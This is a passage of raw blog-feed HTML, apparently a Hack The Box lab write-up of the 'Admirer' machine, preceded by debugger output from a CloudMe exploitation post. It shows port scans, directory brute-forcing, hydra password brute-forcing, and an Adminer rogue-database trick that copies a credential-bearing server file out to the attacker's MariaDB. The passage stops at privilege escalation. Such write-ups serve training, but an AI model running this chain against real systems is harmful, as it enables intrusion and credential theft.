</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">================================================================================</span>
  Output generated by mona.py v2.0, rev <span style="color:#bd93f9">613</span> - Immunity Debugger
  Corelan Team - https://www.corelan.be
<span style="color:#ff79c6">================================================================================</span>
  OS : 10, release 10.0.18362
  Process being debugged : CloudMe <span style="color:#ff79c6">(</span>pid 4160<span style="color:#ff79c6">)</span>
  Current mona arguments: <span style="color:#8be9fd;font-style:italic">findmsp</span>
<span style="color:#ff79c6">================================================================================</span>
  2020-10-04 23:29:40
<span style="color:#ff79c6">================================================================================</span>
-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename &amp; Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x76b10000 | 0x76b27000 | 0x00017000 | True   | True    | True  |  False   | True   | 10.0.18362.1 <span style="color:#ff79c6">[</span>profapi.dll<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\p</span>rofapi.dll<span style="color:#ff79c6">)</span>
 0x74610000 | 0x74626000 | 0x00016000 | True   | True    | True  |  False   | True   | 10.0.18362.1 <span style="color:#ff79c6">[</span>NLAapi.dll<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\N</span>LAapi.dll<span style="color:#ff79c6">)</span>
 0x769e0000 | 0x76a5c000 | 0x0007c000 | True   | True    | True  |  False   | True   | 10.0.18362.387 <span style="color:#ff79c6">[</span>msvcp_win.dll<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\m</span>svcp_win.dll<span style="color:#ff79c6">)</span>
 0x68a80000 | 0x69055000 | 0x005d5000 | False  | False   | False |  False   | False  | 5.9.0.0 <span style="color:#ff79c6">[</span>Qt5Core.dll<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\U</span>ser<span style="color:#f1fa8c">\A</span>ppData<span style="color:#f1fa8c">\L</span>ocal<span style="color:#f1fa8c">\P</span>rograms<span style="color:#f1fa8c">\C</span>loudMe<span style="color:#f1fa8c">\C</span>loudMe<span style="color:#f1fa8c">\Q</span>t5Core.dll<span style="color:#ff79c6">)</span>
 0x74be0000 | 0x74d3a000 | 0x0015a000 | True   | True    | True  |  False   | True   | 10.0.18362.535 <span style="color:#ff79c6">[</span>gdi32full.dll<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\S</span>ystem32<span style="color:#f1fa8c">\g</span>di32full.dll<span style="color:#ff79c6">)</span>
 0x74090000 | 0x74151000 | 0x000c1000 | True   | True    | True  |  False   | True   | 10.0.18362.387 <span style="color:#ff79c6">[</span>dxgi.dll<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\d</span>xgi.dll<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><p>We find Qt5Core.dll has all security features set to False</p>
<h2 id="windows-docker-container">Windows docker container</h2>
<p><a href="https://hub.docker.com/_/microsoft-windows-servercore">https://hub.docker.com/_/microsoft-windows-servercore</a></p>
<p>docker pull mcr.microsoft.com/windows/servercore:10.0.17134.1305</p>
]]></content></item><item><title>HTB - Admirer</title><link>https://0xade1.github.io/posts/2020/09/htb-admirer/</link><pubDate>Sat, 26 Sep 2020 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2020/09/htb-admirer/</guid><description>nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 _ admirer nmap -p- --min-rate=3000 -T4 10.10.10.187 [...] PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http _ admirer nmap -sC -sV -p21,22,80 10.10.10.187 [...] PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) | ssh-hostkey: | 2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA) | 256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA) |_ 256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519) 80/tcp open http Apache httpd 2.</description><content type="html"><![CDATA[<h1 id="nmap">nmap</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  admirer nmap -p- --min-rate<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3000</span> -T4 10.10.10.187
<span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
_  admirer nmap -sC -sV  -p21,22,80 10.10.10.187
<span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 <span style="color:#ff79c6">(</span>protocol 2.0<span style="color:#ff79c6">)</span>
| ssh-hostkey:
|   <span style="color:#bd93f9">2048</span> 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 <span style="color:#ff79c6">(</span>RSA<span style="color:#ff79c6">)</span>
|   <span style="color:#bd93f9">256</span> c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 <span style="color:#ff79c6">(</span>ECDSA<span style="color:#ff79c6">)</span>
|_  <span style="color:#bd93f9">256</span> d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 <span style="color:#ff79c6">(</span>ED25519<span style="color:#ff79c6">)</span>
80/tcp open  http    Apache httpd 2.4.25 <span style="color:#ff79c6">((</span>Debian<span style="color:#ff79c6">))</span>
| http-robots.txt: <span style="color:#bd93f9">1</span> disallowed entry
|_/admin-dir
|_http-server-header: Apache/2.4.25 <span style="color:#ff79c6">(</span>Debian<span style="color:#ff79c6">)</span>
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></td></tr></table>
</div>
</div><ul>
<li>robots.txt reveals a /admin-dir</li>
</ul>
<h1 id="gobuster">gobuster</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://10.10.10.187/admin-dir/ -w /opt/dictionaries/directory-list-2.3-medium.txt -t <span style="color:#bd93f9">30</span> -x txt,php,html
<span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
/contacts.txt <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
/credentials.txt <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="ftpuser">ftpuser</h1>
<p>all contacts and credentials are dead end, except ftpuser</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  admirer ftp -p 10.10.10.187
Connected to 10.10.10.187.
<span style="color:#bd93f9">220</span> <span style="color:#ff79c6">(</span>vsFTPd 3.0.3<span style="color:#ff79c6">)</span>
Name <span style="color:#ff79c6">(</span>10.10.10.187:ctf<span style="color:#ff79c6">)</span>: ftpuser
<span style="color:#bd93f9">331</span> Please specify the password.
Password:
<span style="color:#bd93f9">230</span> Login successful.
Remote system <span style="color:#8be9fd;font-style:italic">type</span> is UNIX.
Using binary mode to transfer files.
ftp&gt; user ftpuser
<span style="color:#bd93f9">331</span> Any password will <span style="color:#ff79c6">do</span>.
Password:
<span style="color:#bd93f9">230</span> Already logged in.
Remote system <span style="color:#8be9fd;font-style:italic">type</span> is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
<span style="color:#bd93f9">227</span> Entering Passive Mode <span style="color:#ff79c6">(</span>10,10,10,187,203,207<span style="color:#ff79c6">)</span>.
<span style="color:#bd93f9">150</span> Here comes the directory listing.
-rw-r--r--    <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">0</span>        <span style="color:#bd93f9">0</span>            <span style="color:#bd93f9">3405</span> Dec <span style="color:#bd93f9">02</span>  <span style="color:#bd93f9">2019</span> dump.sql
-rw-r--r--    <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">0</span>        <span style="color:#bd93f9">0</span>         <span style="color:#bd93f9">5270987</span> Dec <span style="color:#bd93f9">03</span>  <span style="color:#bd93f9">2019</span> html.tar.gz
<span style="color:#bd93f9">226</span> Directory send OK.
</code></pre></td></tr></table>
</div>
</div><ul>
<li>the dump.sql reveals nothing interesting</li>
<li>the html.tar.gz reveals:
<ul>
<li>index.php: <code>$username = &quot;waldo&quot;; $password = &quot;]F7jLHw:*G&gt;UPrTo}~A&quot;d6b&quot;;</code> but this is a dead end as well</li>
<li><em>utility-scripts</em> web directory containing more interesting files:
<ul>
<li>admin_tasks.php: <code>echo str_replace(&quot;\n&quot;, &quot;&lt;br /&gt;&quot;, shell_exec(&quot;/opt/scripts/admin_tasks.sh $task 2&gt;&amp;1&quot;));</code> we can&rsquo;t really exploits this right now</li>
<li>db_admin.php: <code>$username = &quot;waldo&quot;; $password = &quot;Wh3r3_1s_w4ld0?&quot;;</code> but this is a dead end as well</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>Putting all users and passwords in files to run with hydra against ssh and ftp services was a dead end too</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hydra -L users.txt -P pwds.txt ftp://10.10.10.187
hydra -L users.txt -P pwds.txt ssh://10.10.10.187
</code></pre></td></tr></table>
</div>
</div><h1 id="extending-fuzzing-exploration">Extending fuzzing exploration</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  admirer gobuster dir -u http://10.10.10.187/utility-scripts/ -w /opt/SecLists/Fuzzing/fuzz-Bo0oM.txt
<span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
/adminer.php <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
/info.php <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
/phptest.php <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><p>the utility-scripts folder contains adminer.php which is a popular mariadb/mysql admin panel</p>
<p>it is vulnerable to SSRF : Server-side Request Forgery, which means that we can make the php page points to our own mariadb instance</p>
<p>This is interesting because, we can for example load files from the victim host running the PHP engine into our local mariadb instance</p>
<h1 id="mariadb">mariadb</h1>
<p>We create a database <em>adminer</em>, a table <em>test</em> and a user:password <em>myuser-adminer:mypassword-adminer</em></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">docker run <span style="color:#6272a4">--name some-mariadb -e MYSQL_ROOT_PASSWORD=my-coco-pw -p3306:3306 -d mariadb:latest
</span><span style="color:#6272a4"></span> <span style="color:#ff79c6">&gt;</span>docker <span style="color:#ff79c6">exec</span> <span style="color:#ff79c6">-</span>it <span style="color:#bd93f9">1</span> bash
root<span style="color:#ff79c6">@</span><span style="color:#bd93f9">14</span>fdca90fce8:<span style="color:#ff79c6">/#</span> mysql <span style="color:#ff79c6">-</span>p
Enter password:
Welcome <span style="color:#ff79c6">to</span> the MariaDB monitor.  Commands <span style="color:#ff79c6">end</span> <span style="color:#ff79c6">with</span> ; <span style="color:#ff79c6">or</span> \<span style="color:#ff79c6">g</span>.
Your MariaDB <span style="color:#ff79c6">connection</span> id <span style="color:#ff79c6">is</span> <span style="color:#bd93f9">20</span>
Server <span style="color:#ff79c6">version</span>: <span style="color:#bd93f9">10</span>.<span style="color:#bd93f9">5</span>.<span style="color:#bd93f9">5</span><span style="color:#ff79c6">-</span>MariaDB<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>:<span style="color:#bd93f9">10</span>.<span style="color:#bd93f9">5</span>.<span style="color:#bd93f9">5</span><span style="color:#ff79c6">+</span>maria<span style="color:#ff79c6">~</span>focal mariadb.org <span style="color:#8be9fd;font-style:italic">binary</span> distribution
[...]
MariaDB [admirer]<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">CREATE</span> <span style="color:#ff79c6">USER</span> <span style="color:#f1fa8c">&#39;myuser-adminer&#39;</span> IDENTIFIED <span style="color:#ff79c6">BY</span> <span style="color:#f1fa8c">&#39;mypassword-adminer&#39;</span>;
MariaDB [admirer]<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">GRANT</span> <span style="color:#ff79c6">USAGE</span> <span style="color:#ff79c6">ON</span> adminer.<span style="color:#ff79c6">*</span> <span style="color:#ff79c6">TO</span> <span style="color:#f1fa8c">&#39;myuser-adminer&#39;</span><span style="color:#ff79c6">@</span><span style="color:#f1fa8c">&#39;%&#39;</span> IDENTIFIED <span style="color:#ff79c6">BY</span> <span style="color:#f1fa8c">&#39;mypassword-adminer&#39;</span>;
MariaDB [admirer]<span style="color:#ff79c6">&gt;</span> FLUSH <span style="color:#ff79c6">PRIVILEGES</span>;
MariaDB [admirer]<span style="color:#ff79c6">&gt;</span> USE admirer;
MariaDB [admirer]<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">GRANT</span> <span style="color:#ff79c6">ALL</span> <span style="color:#ff79c6">PRIVILEGES</span> <span style="color:#ff79c6">ON</span> <span style="color:#ff79c6">*</span>.<span style="color:#ff79c6">*</span> <span style="color:#ff79c6">TO</span> <span style="color:#f1fa8c">&#39;myuser-adminer&#39;</span><span style="color:#ff79c6">@</span><span style="color:#f1fa8c">&#39;%&#39;</span>;
MariaDB [admirer]<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">create</span> <span style="color:#ff79c6">table</span> test(<span style="color:#ff79c6">data</span> <span style="color:#8be9fd;font-style:italic">VARCHAR</span>(<span style="color:#bd93f9">255</span>));
</code></pre></td></tr></table>
</div>
</div><ol>
<li>On the victim page <code>http://10.10.10.187/utility-scripts/adminer.php</code>, we put our host IP address, our username and password and our database name. Connexion is successfully established</li>
<li>On the adminer.php page, we can execute a script to write any remote file into our database:</li>
</ol>
<pre tabindex="0"><code>load data local infile '../index.php'
into table test
fields terminated by &quot;/n&quot;

Query executed OK, 123 rows affected. (0.179 s) Edit, Warnings
</code></pre><p>We can now explore the index.php and we find that the password has been changed</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">MariaDB [(none)]<span style="color:#ff79c6">&gt;</span> select <span style="color:#ff79c6">*</span> from test
[<span style="color:#ff79c6">...</span>]
<span style="color:#ff79c6">|</span>                         <span style="color:#8be9fd;font-style:italic">$servername</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;localhost&#34;</span>;                                                                              <span style="color:#ff79c6">|</span>
<span style="color:#ff79c6">|</span>                         <span style="color:#8be9fd;font-style:italic">$username</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;waldo&#34;</span>;                                                                                    <span style="color:#ff79c6">|</span>
<span style="color:#ff79c6">|</span>                         <span style="color:#8be9fd;font-style:italic">$password</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;&#34;</span>;                                                                  <span style="color:#ff79c6">|</span>
<span style="color:#ff79c6">|</span>                         <span style="color:#8be9fd;font-style:italic">$dbname</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;admirerdb&#34;</span>;                                                                                  <span style="color:#ff79c6">|</span>
<span style="color:#ff79c6">|</span>                                                                                                                                 <span style="color:#ff79c6">|</span>
</code></pre></td></tr></table>
</div>
</div><p>we can ssh with the same username and password to get the user.txt flag</p>
<h1 id="privilege-escalation">Privilege escalation</h1>
<p>user can execute as root a script</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
